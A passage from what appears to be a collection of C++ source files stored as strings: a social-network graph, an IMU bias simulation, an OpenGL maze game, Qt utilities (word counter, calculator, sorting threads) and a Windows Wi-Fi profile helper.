removed between \" << user1 << \" and \" << user2 << \".\\n\";\r\n        } else {\r\n            cout << \"One or both users do not exist.\\n\";\r\n        }\r\n    }\r\n\r\n    void displayConnections(const string& user) const {\r\n        if (adjacencyList.find(user) != adjacencyList.end()) {\r\n            cout << \"Connections of \" << user << \": \";\r\n            for (const auto& connection : adjacencyList.at(user).connections) {\r\n                cout << connection.first << \"(Weight: \" << connection.second << \") \";\r\n            }\r\n            cout << \"\\n\";\r\n        } else {\r\n            cout << \"User \" << user << \" does not exist.\\n\";\r\n        }\r\n    }\r\n\r\n    void displayMutualConnections(const string& user1, const string& user2) const {\r\n        if (adjacencyList.find(user1) != adjacencyList.end() && adjacencyList.find(user2) != adjacencyList.end()) {\r\n            cout << \"Mutual connections between \" << user1 << \" and \" << user2 << \": \";\r\n            for (const auto& connection : adjacencyList.at(user1).connections) {\r\n                if (adjacencyList.at(user2).connections.find(connection.first) != adjacencyList.at(user2).connections.end()) {\r\n                    cout << connection.first << \" \";\r\n                }\r\n            }\r\n            cout << \"\\n\";\r\n        } else {\r\n            cout << \"One or both users do not exist.\\n\";\r\n        }\r\n    }\r\n\r\n    vector<string> shortestPath(const string& start, const string& end) {\r\n        unordered_map<string, string> predecessors;\r\n        unordered_map<string, bool> visited;\r\n        queue<string> q;\r\n\r\n        q.push(start);\r\n        visited[start] = true;\r\n\r\n        while (!q.empty()) {\r\n            string current = q.front();\r\n            q.pop();\r\n\r\n            if (current == end) {\r\n                vector<string> path;\r\n                for (string at = end; at != \"\"; at = predecessors[at]) {\r\n                    path.push_back(at);\r\n                }\r\n                reverse(path.begin(), path.end());\r\n                return path;\r\n            }\r\n\r\n            for (const auto& neighbor : adjacencyList[current].connections) {\r\n                if (!visited[neighbor.first]) {\r\n                    q.push(neighbor.first);\r\n                    visited[neighbor.first] = true;\r\n                    predecessors[neighbor.first] = current;\r\n                }\r\n            }\r\n        }\r\n\r\n        return {}; // Return an empty path if no path exists\r\n    }\r\n\r\n    void displayDegreeCentrality(const string& user) const {\r\n        if (adjacencyList.find(user) != adjacencyList.end()) {\r\n            cout << \"Degree centrality of \" << user << \": \" << adjacencyList.at(user).connections.size() << \"\\n\";\r\n        } else {\r\n            cout << \"User \" << user << \" does not exist.\\n\";\r\n        }\r\n    }\r\n",
    "#include <chrono>\n#include <iostream>\n#include <map>\n#include <fstream>\n#include <random>\n#include <vector>\n#include <Eigen/Dense>\n\nusing namespace std;\n// \u89c2\u5bdfacc bias\u7684\u53ef\u89c2\u6027\uff0c\u7814\u7a76acc bias\u5982\u4f55\u6fc0\u52b1\u51fa\u6765\n// \u8f93\u5165\uff1a\u4e0d\u542b\u5c3a\u5ea6\u7684pose\u3001gyroscope\u8bfb\u6570\u3001accelerator\u8bfb\u6570\u3001\u76f8\u5e94\u566a\u58f0\u3001\u91cd\u529b(W\u7cfb\u4e0b)\u3001\u5173\u952e\u5e27\u4e2a\u6570\u3001\u91c7\u6837\u65f6\u95f4(\u56fe\u50cf\u3001IMU)\u3001gyro & acc bias\n// \u89e3\u7b97\uff1a\u91cd\u529b(c0\u7cfb\u4e0b)\u3001\u5c3a\u5ea6\u3001acc bias\u3001\u6062\u590d\u5404\u65f6\u523b\u901f\u5ea6\n\n/*===========================================================*/\n/*================ Control Parameter ========================*/\n/*===========================================================*/\nconstexpr int kImuFrequency = 120; // hz\nconstexpr double kImuSamplePeriod = 1.0 / 120; // s\nconstexpr int kKeyFrameFrequency = 1; // hz\nconst int kImu2ImgRate = kImuFrequency / kKeyFrameFrequency; // \u6bcf\u9694\u591a\u5c11\u4e2aIMU\u53d6\u4e00\u4e2a\u5173\u952e\u5e27\nconstexpr double kScale = 0.5;\nconstexpr double kRad2Deg = 180 / M_PI;\nconstexpr double kDeg2Rad = M_PI / 180;\nconstexpr double kGravityValue = 9.80;\nconstexpr bool kAddNoise2Acc = false;\nconstexpr double kAccNoiseStd = 0.1; // noise\u76f8\u6bd4acc\u771f\u5b9e\u503c\u8fc7\u5927\u65f6\uff0c\u5c06\u5f71\u54cdacc bias\u7684\u53ef\u89c2\u6027\nconstexpr bool kAddNoise2Gyr = false;\nconstexpr double kGyrNoiseStd = 0.01 * kDeg2Rad; // gyro noise\u4f1a\u6781\u5927\u5730\u5f71\u54cd acc bias\u7684\u53ef\u89c2\u6027\nconst Eigen::Vector3d v0(0.1, 0.2, 0.1); // IMU \u9700\u8981\u8003\u8651\u521d\u59cb\u901f\u5ea6, c0\u7cfb\u4e0b\nconst Eigen::Vector3d accBias(0.2, 0.19, 0.05);\nconst Eigen::Vector3d gyrBias(0.0, 0.0, 0.0);\nEigen::Vector3d G_c0(-1, -2, -3); // c0 \u7cfb\u4e0b\u7684\u5b9e\u9645\u91cd\u529b(\u542b\u65b9\u5411)\uff0c\u8ba4\u4e3ac\u7cfb\u4e0eb\u7cfb\u91cd\u5408\n\n/*===========================================================*/\n/*=================== Declaration ===========================*/\n/*===========================================================*/\nEigen::Quaterniond DeltaQ(const Eigen::Vector3d& angle);\n\nEigen::Matrix3d skewSymmetric(const Eigen::Vector3d &v);\n\nvoid GenerateIMUdata(const int keyframeNum, vector<Eigen::Vector3d> &gyr, vector<Eigen::Vector3d> &acc);\n\nvoid GeneratePreintergrateQPVandQPVandPreintergrateJacobian(const vector<Eigen::Vector3d> &gyr, const vector<Eigen::Vector3d> &acc, const int keyframeNum,\n        vector<Eigen::Quaterniond> &dQ, vector<Eigen::Vector3d> &dP, vector<Eigen::Vector3d> &dV, \n        vector<Eigen::Quaterniond> &Q, vector<Eigen::Vector3d> &P, vector<Eigen::Vector3d> &V, \n        vector<Eigen::Matrix3d> &Jdp, vector<Eigen::Matrix3d> &Jdv);\n\nvoid ScaleP(vector<Eigen::Vector3d> &P);\n\nEigen::Vector4d EvaluateScaleAndGc0(const vector<Eigen::Quaterniond> &dQ, const vector<Eigen::Vector3d> &dP, const vector<Eigen::Vector3d> &dV, \n        const vector<Eigen::Quaterniond> &Q, const vector<Eigen::Vector3d> &P, const vector<Eigen::Vector3d> &V);\n\nvoid UnScaleP(const double scale, vector<Eigen::Vector3d> &P);\n\nEigen::Matrix3d CalculateRc0_w(const Eigen::Vector3d &g_c0);\n\nEigen::Matrix<double, 6, 1> UpdateScaleAndRc0_wAndAccBias(const Eigen::Matrix3d &Rc0_w, const vector<Eigen::Quaterniond> &Q, const vector<Eigen::Vector3d> &P,\n    const vector<Eigen::Vector3d> &dP, const vector<Eigen::Vector3d> &dV,\n    const vector<Eigen::Matrix3d> &Jdp, const vector<Eigen::Matrix3d> &Jdv);\n\nvoid UpdateRc0_w(const double theta_x, const double theta_y, Eigen::Matrix3d &Rc0_w);\n\nvector<Eigen::Vector3d> RecoverVelocity(const vector<Eigen::Quaterniond> &Q, const vector<Eigen::Vector3d> &P, const vector<Eigen::Vector3d> &dP, \n    const vector<Eigen::Vector3d> &dV, const vector<Eigen::Matrix3d> &Jdp, const vector<Eigen::Matrix3d> &Jdv, \n    const Eigen::Vector3d accBias, const Eigen::Matrix3d &Rc0_w);\n\n/*========================================================*/\n/*=================== Pipeline ===========================*/\n/*========================================================*/\nint main(){\n\n    const int keyframeNum = 6;\n    vector<Eigen::Vector3d> gyr, acc;\n    GenerateIMUdata(keyframeNum, gyr, acc);\n    vector<Eigen::Quaterniond> dQ, Q;\n    vector<Eigen::Vector3d> dP, dV, P, V;\n    vector<Eigen::Matrix3d> Jdp, Jdv; // dP, dV\u5173\u4e8eaccBias\u7684\u5bfc\u6570\n    GeneratePreintergrateQPVandQPVandPreintergrateJacobian(gyr, acc, keyframeNum, dQ, dP, dV, Q, P, V, Jdp, Jdv);\n    \n    ScaleP(P);\n    Eigen::Vector4d scaleAndGc0 = EvaluateScaleAndGc0(dQ, dP, dV, Q, P, V);\n    UnScaleP(scaleAndGc0[0], P);\n    \n    Eigen::Matrix3d Rc0_w = CalculateRc0_w(scaleAndGc0.tail(3));\n\n    const Eigen::Matrix<double, 6, 1> s_theta_ba = UpdateScaleAndRc0_wAndAccBias(Rc0_w, Q, P, dP, dV, Jdp, Jdv);\n    UnScaleP(s_theta_ba[0], P);\n    // \u6c42\u89e3\u51fa\u6c34\u5e73\u59ff\u6001\u89d2\u5ea6\u589e\u91cf\u540e\uff0c\u5fc5\u987b\u5bf9Rc0_w\u8fdb\u884c\u66f4\u65b0\uff0c\u5931\u4e4b\u6beb\u5398\uff0c\u5dee\u4e4b\u5343\u91cc\uff0c\u8fd9\u5c31\u662f\u6570\u5b66\u7684\u4e25\u8c28\n    UpdateRc0_w(s_theta_ba[1], s_theta_ba[2], Rc0_w);\n\n    const vector<Eigen::Vector3d> v = RecoverVelocity(Q, P, dP, dV, Jdp, Jdv, s_theta_ba.tail(3), Rc0_w);\n    for(int i = 0; i < Q.size(); ++i) {\n        cout << \"diff v[\" << i << \"] - V[\" << i << \"]\" << (v[i] - V[i]).norm() << endl;\n    }\n\n    return 0;\n}\n\n/*=======================================================*/\n/*================= Realization =========================*/\n/*=======================================================*/\nEigen::Quaterniond DeltaQ(const Eigen::Vector3d& angle) {\n        Eigen::Matrix3d Rc1c2 = Eigen::AngleAxisd(angle.norm(), angle.normalized()).toRotationMatrix();\n        Eigen::Quaterniond DeltaQ(Rc1c2);\n        DeltaQ.normalize();\n     ",
    "#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n#include <learnopengl/shader.h>\n#include <learnopengl/camera.h>\n#include <learnopengl/model.h>\n#include <iostream>\n\n#define STB_IMAGE_IMPLEMENTATION\n#include <learnopengl/stb_image.h>\n\n// Callback functions\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height);\nvoid mouse_callback(GLFWwindow* window, double xpos, double ypos);\nvoid scroll_callback(GLFWwindow* window, double xoffset, double yoffset);\nvoid processInput(GLFWwindow* window);\n\n// Settings\nconst unsigned int SCR_WIDTH = 1920;\nconst unsigned int SCR_HEIGHT = 1000;\n\n// Camera\nCamera camera(glm::vec3(0.0f, 1.8f, 3.0f)); // Altura de 1.8f para simular la altura de una persona\nfloat lastX = SCR_WIDTH / 2.0f;\nfloat lastY = SCR_HEIGHT / 2.0f;\nbool firstMouse = true;\n\n// Timing\nfloat deltaTime = 0.0f;\nfloat lastFrame = 0.0f;\n\n// Constants\nconst float CAMERA_HEIGHT = 1.8f; // Altura fija de la c\u00e1mara para simular una persona\nconst glm::vec2 ROOM_MIN = glm::vec2(-12.0f, -12.0f); // Coordenadas m\u00ednimas de la sala (paredes exteriores)\nconst glm::vec2 ROOM_MAX = glm::vec2(12.0f, 12.0f);   // Coordenadas m\u00e1ximas de la sala (paredes exteriores)\n\n// Define las cajas de colisi\u00f3n para cada modelo\nstruct AABB {\n    glm::vec3 center;  // Centro de la caja\n    glm::vec3 halfSize; // Mitad del tama\u00f1o (dimensiones / 2)\n};\n\nAABB model1AABB = { glm::vec3(0.0f, 0.0f, 0.0f), glm::vec3(0.5f, 1.0f, 0.5f) };\nAABB model2AABB = { glm::vec3(0.0f, 2.0f, 0.0f), glm::vec3(0.7f, 0.7f, 0.7f) };\nAABB model3AABB = { glm::vec3(2.0f, 0.0f, -1.5f), glm::vec3(0.04f, 0.04f, 0.04f) };\nAABB model4AABB = { glm::vec3(1.0f, 0.0f, 1.0f), glm::vec3(1.0f, 1.0f, 1.0f) };\nAABB model5AABB = { glm::vec3(0.0f, 2.0f, 0.0f), glm::vec3(1.0f, 1.0f, 1.0f) };\n\n// Funci\u00f3n de detecci\u00f3n de colisiones\nbool CheckCollision(AABB box, glm::vec3 position) {\n    glm::vec3 min = box.center - box.halfSize;\n    glm::vec3 max = box.center + box.halfSize;\n\n    // Comprobar si la posici\u00f3n est\u00e1 dentro de los l\u00edmites de la caja\n    return (position.x > min.x && position.x < max.x &&\n        position.z > min.z && position.z < max.z);\n}\n\nint main()\n{\n    // GLFW: Initialize and configure\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    // GLFW window creation\n    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, \"Proyecto - Juego Backroom\", NULL, NULL);\n    if (window == NULL)\n    {\n        std::cout << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n    glfwSetCursorPosCallback(window, mouse_callback);\n    glfwSetScrollCallback(window, scroll_callback);\n\n    // Tell GLFW to capture our mouse\n    glfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n\n    // GLAD: Load all OpenGL function pointers\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n\n    // Flip loaded textures on the y-axis before loading model\n    stbi_set_flip_vertically_on_load(true);\n\n    // Configure global OpenGL state\n    glEnable(GL_DEPTH_TEST);\n\n    // Build and compile shaders\n    Shader ourShader(\"shaders/shader_model_loading.vs\", \"shaders/shader_model_loading.fs\");\n\n    // Load models\n    Model ourModel(\"D:/Descargas/Backrooms-OpenGL-main/Backrooms-OpenGL-main/backroom_scene/model.obj\");\n    Model otherModel(\"D:/Descargas/mO5/model.obj\"); // Ruta al nuevo modelo\n    Model thirdModel(\"D:/Descargas/globo_entidad/model2.obj\"); // Ruta al tercer modelo\n    Model fourthModel(\"D:/Descargas/mosuntroGrande/model.obj\"); // Ruta al cuarto modelo\n    Model fiveModel(\"D:/Descargas/jerry/model.obj\"); // Ruta al cuarto modelo\n\n    // Render loop\n    while (!glfwWindowShouldClose(window))\n    {\n        // L\u00f3gica de tiempo por cuadro\n        float currentFrame = glfwGetTime();\n        deltaTime = currentFrame - lastFrame;\n        lastFrame = currentFrame;\n\n        // Input\n        processInput(window);\n\n        // Posici\u00f3n anterior de la c\u00e1mara\n        glm::vec3 prevPosition = camera.Position;\n\n        // Movimiento de la c\u00e1mara (sin movimiento autom\u00e1tico hacia adelante)\n        camera.Position.y = CAMERA_HEIGHT;\n        camera.Position.x = glm::clamp(camera.Position.x, ROOM_MIN.x, ROOM_MAX.x);\n        camera.Position.z = glm::clamp(camera.Position.z, ROOM_MIN.y, ROOM_MAX.y);\n\n        // Verificar colisiones y revertir la posici\u00f3n si es necesario\n        if (CheckCollision(model1AABB, camera.Position) ||\n            CheckCollision(model2AABB, camera.Position) ||\n            CheckCollision(model3AABB, camera.Position) ||",
    "#include \"WordCounterController.h\"\n\n#include \"utils/WorkerThread.h\"\n\n#include <QMessageBox>\n\nWordCounterController::WordCounterController(QObject* ipParent) : QObject(ipParent) {}\n\nWordCounterController::~WordCounterController()\n{\n  abort();\n}\n\nQVariantList WordCounterController::GetHistogramList() const\n{\n  QVariantList list;\n\n  for (auto it = _histogram.begin(); it != _histogram.end(); ++it) {\n    QVariantMap entry;\n    entry[\"key\"] = it.key();\n    entry[\"value\"] = it.value();\n    list.append(entry);\n  }\n\n  std::sort(list.begin(), list.end(), [](const QVariant& iFirst, const QVariant& iSecond) {\n    return iFirst.toMap()[\"value\"].toInt() > iSecond.toMap()[\"value\"].toInt();\n  });\n\n  return list;\n}\n\nQUrl WordCounterController::GetFilePath() const\n{\n  return _filePath;\n}\n\nvoid WordCounterController::SetFilePath(const QUrl& iNewFilePath)\n{\n  if (_filePath == iNewFilePath)\n    return;\n\n  _filePath = iNewFilePath;\n\n  abort();\n\n  emit filePathChanged();\n}\n\nvoid WordCounterController::start()\n{\n  SetIsCanceled(false);\n  SetIsPaused(false);\n}\n\nvoid WordCounterController::pause()\n{\n  SetIsPaused(true);\n}\n\nvoid WordCounterController::abort()\n{\n  SetIsPaused(false);\n  SetIsCanceled(true);\n}\n\nvoid WordCounterController::SetIsCanceled(bool iNewIsCanceled)\n{\n  if (_isCanceled == iNewIsCanceled)\n    return;\n\n  if (iNewIsCanceled) {\n    if (_workerThread && _workerThread->isRunning()) {\n      _workerThread->requestInterruption();\n      _workerThread->wait();\n\n      SetHistogram({});\n    }\n  }\n  else {\n    if (!(_workerThread && _workerThread->isRunning())) {\n      // Creating a worker. If the file could not be opened, the worker will not be created\n      try {\n        _workerThread = new WorkerThread(_filePath.toLocalFile(), this);\n      }\n      catch (const std::runtime_error& e) {\n        QMessageBox::warning(nullptr, QObject::tr(\"Open file error\"), e.what());\n        return;\n      }\n      connect(_workerThread, &WorkerThread::finished, _workerThread, &QObject::deleteLater);\n      connect(_workerThread, &WorkerThread::wordsCountsReady, this, &WordCounterController::SetHistogram);\n      _workerThread->start();\n    }\n  }\n\n  _isCanceled = iNewIsCanceled;\n\n  emit isCanceledChanged();\n}\n\nvoid WordCounterController::SetIsPaused(bool iNewIsPaused)\n{\n  if (!(_workerThread && _workerThread->isRunning()))\n    return;\n\n  if (_isPaused == iNewIsPaused)\n    return;\n\n  _isPaused = iNewIsPaused;\n\n  _workerThread->SetIsPaused(_isPaused);\n\n  emit isPausedChanged();\n}\n\nvoid WordCounterController::SetHistogram(QVariantMap iHistogram)\n{\n  if (_histogram == iHistogram)\n    return;\n\n  _histogram = iHistogram;\n\n  emit histogramChanged();\n}\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <string>\n#include <cmath>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    // Establecer un tama\u00f1o fijo para la ventana\n    setFixedSize(455, 530); // Tama\u00f1o fijo de 800x600 p\u00edxeles\n    ui->setupUi(this);\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nvoid MainWindow::on_boton0_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"0\");\n}\n\nvoid MainWindow::on_boton1_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"1\");\n}\n\nvoid MainWindow::on_boton2_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"2\");\n}\n\nvoid MainWindow::on_boton3_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"3\");\n}\n\nvoid MainWindow::on_boton4_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"4\");\n}\n\nvoid MainWindow::on_boton5_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"5\");\n}\n\nvoid MainWindow::on_boton6_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"6\");\n}\n\nvoid MainWindow::on_boton7_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"7\");\n}\n\nvoid MainWindow::on_boton8_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"8\");\n}\n\nvoid MainWindow::on_boton9_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \"9\");\n}\n\nvoid MainWindow::on_coma_clicked()\n{\n    ui->calc_Line_Edit->setText(ui->calc_Line_Edit->text() + \",\");\n}\n\nvoid MainWindow::on_clear_button_clicked()\n{\n    ui->calc_Line_Edit->clear();\n    ui->operador->clear();\n    this->operador.clear();\n}\n\n\nvoid MainWindow::on_suma_clicked()\n{\n    this->operador = \"+\";\n    // Convertir QString a std::string\n    std::string str = ui->calc_Line_Edit->text().toStdString();\n    // Convertir std::string a long double usando std::stold\n    this->operando1 = std::stold(str);\n    ui->operador->setText(ui->calc_Line_Edit->text() + \" +\");\n    ui->calc_Line_Edit->clear();\n}\n\n\nvoid MainWindow::on_resta_clicked()\n{\n    this->operador = \"-\";\n    std::string str = ui->calc_Line_Edit->text().toStdString();\n    this->operando1 = std::stold(str);\n    ui->operador->setText(ui->calc_Line_Edit->text() + \" -\");\n    ui->calc_Line_Edit->clear();\n}\n\n\nvoid MainWindow::on_mul_clicked()\n{\n    this->operador = \"*\";\n    std::string str = ui->calc_Line_Edit->text().toStdString();\n    this->operando1 = std::stold(str);\n    ui->operador->setText(ui->calc_Line_Edit->text() + \" *\");\n    ui->calc_Line_Edit->clear();\n}\n\n\nvoid MainWindow::on_div_clicked()\n{\n    this->operador = \"/\";\n    std::string str = ui->calc_Line_Edit->text().toStdString();\n    this->operando1 = std::stold(str);\n    ui->operador->setText(ui->calc_Line_Edit->text() + \" /\");\n    ui->calc_Line_Edit->clear();\n}\n\nbool MainWindow::no_tiene_parte_decimal(long double& res){\n    long double parteEntera;\n    long double fractionalPart = std::modf(res, &parteEntera);\n    // Compara si la parte fraccionaria es aproximadamente 0\n    return std::fabs(fractionalPart) < 1e-10; // Usar una tolerancia para errores de precisi\u00f3n\n}\n\nvoid MainWindow::on_boton_igual_clicked()\n{\n    ui->operador->clear();\n    std::string str = ui->calc_Line_Edit->text().toStdString();\n    long double operando2 = std::stold(str);\n    long double result;\n    if (this->operador == \"+\"){\n        result = this->operando1 + operando2;\n        if (no_tiene_parte_decimal(result)){\n            // Redondear y convertir a int\n            int resultado_entero = std::llround(result);\n            ui->calc_Line_Edit->setText(QString::number(resultado_entero));\n        } else {\n            ui->calc_Line_Edit->setText(QString::number(result, 'f', 10));\n        }\n        return;\n    }\n    if (this->operador == \"-\"){\n        result = this->operando1 - operando2;\n        if (no_tiene_parte_decimal(result)){\n            // Redondear y convertir a int\n            int resultado_entero = std::llround(result);\n            ui->calc_Line_Edit->setText(QString::number(resultado_entero));\n        } else {\n            ui->calc_Line_Edit->setText(QString::number(result, 'f', 10));\n        }\n        return;\n    }\n    if (this->operador == \"*\"){\n        result = this->operando1 * operando2;\n        if (no_tiene_parte_decimal(result)){\n            // Redondear y convertir a int\n            int resultado_entero = std::llround(result);\n            ui->calc_Line_Edit->setText(QString::number(resultado_entero));\n        } else {\n            ui->calc_Line_Edit->setText(QString::number(result, 'f', 10));\n        }\n        return;\n    }\n    if (this->operador == \"/\"){\n        result = this->operando1 / operando2;\n        if (no_tiene_parte_decimal(result)){\n            // Redondear y convertir a int\n            int resultado_entero = std::llround(result);\n            ui->calc_Line_Edit->setText(QString::number(resultado_entero));\n        } else {\n            ui->calc_Line_Edit->setText(QS",
    "#include \"mythread.h\"\n#include<QElapsedTimer>\n#include<QDebug>\nMyThread::MyThread(QObject *parent) : QThread(parent)\n{\n\n}\n\nvoid MyThread::run()\n{\n    qDebug()<<\"\u751f\u6210\u968f\u673a\u6570\u7684\u7ebf\u7a0b\u5730\u5740:\"<<QThread::currentThread();\n    QVector<int>list;\n    QElapsedTimer timer;\n    timer.start();\n    for(int i=0;i<num;i++)\n    {\n        list.push_back(qrand()%10000);\n    }\n    qDebug()<<\"\u751f\u6210\u968f\u673a\u6570\u7528\u65f6:\"<<timer.nsecsElapsed()<<\"\u5fae\u79d2\";\n    emit emitData(list);\n}\n\nvoid MyThread::reciveNum(int num)\n{\n    this->num=num;\n}\n\nBubbleThread::BubbleThread(QObject *parent): QThread(parent)\n{\n\n}\n\nvoid BubbleThread::run()\n{\n    //sleep(3);\n    qDebug()<<\"\u5192\u6ce1\u6392\u5e8f\u7ebf\u7a0b\u5730\u5740:\"<<QThread::currentThread();\n    QElapsedTimer timer;\n    timer.start();\n    bubbleSort(list,list.size());\n    qDebug()<<\"\u5192\u6ce1\u6392\u5e8f\u7528\u65f6:\"<<timer.elapsed()<<\"\u6beb\u79d2\";\n    emitData(list);\n}\n\nvoid BubbleThread::reciveNum(QVector<int> list)\n{\n    this->list=list;\n    qDebug()<<\"\u63a5\u6536\u5230\u4e86\u6570\u636e:\"<<\"list.size():\"<<this->list.size();\n}\n\nvoid BubbleThread::bubbleSort(QVector<int> &arr, int n)\n{\n    int i, j, temp;\n        for (i = 0; i < n-1; i++) { // \u5916\u5c42\u5faa\u73af\uff0c\u63a7\u5236\u6392\u5e8f\u7684\u8f6e\u6570\n            for (j = 0; j < n-i-1; j++) { // \u5185\u5c42\u5faa\u73af\uff0c\u63a7\u5236\u6bcf\u8f6e\u6bd4\u8f83\u7684\u6b21\u6570\n                if (arr[j] > arr[j+1]) { // \u5982\u679c\u5f53\u524d\u5143\u7d20\u5927\u4e8e\u4e0b\u4e00\u4e2a\u5143\u7d20\uff0c\u5219\u4ea4\u6362\u5b83\u4eec\n                    temp = arr[j];\n                    arr[j] = arr[j+1];\n                    arr[j+1] = temp;\n                }\n            }\n        }\n}\n\n\n\nQuickSortThread::QuickSortThread(QObject *parent): QThread(parent)\n{\n\n}\n\nvoid QuickSortThread::run()\n{\n    qDebug()<<\"\u5feb\u901f\u6392\u5e8f\u7ebf\u7a0b\u5730\u5740:\"<<QThread::currentThread();\n    QElapsedTimer timer;\n    timer.start();\n    quickSort(list,0,list.size()-1);\n    qDebug()<<\"\u5feb\u901f\u6392\u5e8f\u7528\u65f6:\"<<timer.elapsed()<<\"\u6beb\u79d2\";\n    emitData(list);\n}\n\nvoid QuickSortThread::reciveNum(QVector<int> list)\n{\n    this->list=list;\n}\n\n\n\nvoid QuickSortThread::quickSort(QVector<int> &arr, int low, int high)\n{\n    if (low < high) {\n        // pi \u662f\u5206\u533a\u540e\u57fa\u51c6\u7684\u7d22\u5f15\u4f4d\u7f6e\n        int pi = partition(arr, low, high);\n\n        // \u5206\u522b\u5bf9\u57fa\u51c6\u5de6\u53f3\u4e24\u8fb9\u7684\u5b50\u6570\u7ec4\u8fdb\u884c\u5feb\u901f\u6392\u5e8f\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n}\n\nint QuickSortThread::partition(QVector<int> &arr, int low, int high)\n{\n    int pivot = arr[high];    // \u9009\u62e9\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4f5c\u4e3a\u57fa\u51c6\n    int i = (low - 1);        // \u8f83\u5c0f\u5143\u7d20\u7684\u7d22\u5f15\n\n    for (int j = low; j <= high - 1; j++) {\n        // \u5982\u679c\u5f53\u524d\u5143\u7d20\u5c0f\u4e8e\u6216\u7b49\u4e8epivot\n        if (arr[j] <= pivot) {\n            i++;    // \u589e\u52a0\u8f83\u5c0f\u5143\u7d20\u7684\u7d22\u5f15\n\n\n\n           int temp=arr[i];\n            arr[i]=arr[j];\n            arr[j]=temp;\n            //swap(arr[i], arr[j]);\n        }\n    }\n    int temp=arr[i+1];\n    arr[i+1]=arr[high];\n    arr[high]=temp;\n    //swap(arr[i + 1], arr[high]);\n    return (i + 1);\n}\n",
    "\ufeff#include \"pch.h\"\n#include <windows.h>\n#include <wlanapi.h>\n#include <objbase.h>\n#include <wtypes.h>\n#include <iostream>\n#include<conio.h>\n#include <sstream>\n#include <iomanip>\n#include <codecvt>\n#include \"WifiLibrary.h\"\n\n#pragma comment(lib, \"wlanapi.lib\")\n#pragma comment(lib, \"ole32.lib\")\n\nHANDLE hClient = NULL;\nPWLAN_INTERFACE_INFO_LIST pIfList = NULL;\n\n//convert string to wchar*\nstd::wstring convertToWideString(const std::string& str) {\n    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;\n    return converter.from_bytes(str);\n}\n\n//create wlan xml profile\nstd::wstring createWLANProfileXML(const std::string& name, const std::string& ssid, const std::string& pass) {\n    std::wostringstream xmlStream;\n    xmlStream << L\"<WLANProfile xmlns=\\\"http://www.microsoft.com/networking/WLAN/profile/v1\\\">\\n\";\n    xmlStream << L\"<name>\" << convertToWideString(name) << L\"</name>\\n\";\n    xmlStream << L\"<SSIDConfig>\\n<SSID>\\n<hex>\";\n    for (char c : name) {\n        xmlStream << std::hex << std::setw(2) << std::setfill(L'0') << (int)(unsigned char)c;\n    }\n    xmlStream << L\"</hex>\\n<name>\" << convertToWideString(ssid) << L\"</name>\\n</SSID>\\n<nonBroadcast>false</nonBroadcast>\\n</SSIDConfig>\\n\";\n    xmlStream << L\"<connectionType>ESS</connectionType>\\n\";\n    xmlStream << L\"<connectionMode>auto</connectionMode>\\n\";\n    xmlStream << L\"<autoSwitch>false</autoSwitch>\\n\";\n    xmlStream << L\"<MSM>\\n<security>\\n<authEncryption>\\n\";\n    xmlStream << L\"<authentication>WPA2PSK</authentication>\\n\";\n    xmlStream << L\"<encryption>AES</encryption>\\n\";\n    xmlStream << L\"<useOneX>false</useOneX>\\n</authEncryption>\\n\";\n    xmlStream << L\"<sharedKey>\\n<keyType>passPhrase</keyType>\\n\";\n    xmlStream << L\"<protected>false</protected>\\n\";\n    xmlStream << L\"<keyMaterial>\" << convertToWideString(pass) << L\"</keyMaterial>\\n\";\n    xmlStream << L\"</sharedKey>\\n<keyIndex>0</keyIndex>\\n</security>\\n</MSM>\\n\";\n    xmlStream << L\"</WLANProfile>\";\n    return xmlStream.str();\n}\n\n//add created profile to windows\n int create_profile(PWLAN_INTERFACE_INFO pIfInfo,const std::string& name, const std::string& ssid, const std::string& pass) {\n    DWORD dwFlags = WLAN_PROFILE_USER;\n    DWORD dwGrantedAccess = 0;\n    std::wstring xmlString = createWLANProfileXML(name, ssid, pass);\n    const LPCWSTR profileXml = xmlString.c_str();\n\n    DWORD dwResult = WlanSetProfile(hClient,\n        &pIfInfo->InterfaceGuid,\n        dwFlags,\n        profileXml,\n        NULL,\n        TRUE,\n        NULL,\n        &dwGrantedAccess);\n\n    if (dwResult != ERROR_SUCCESS) {\n        std::cerr << \"WlanSetProfile failed with error: \" << dwResult << std::endl;\n        WlanFreeMemory(pIfList);\n        WlanCloseHandle(hClient, NULL);\n        return 1;\n    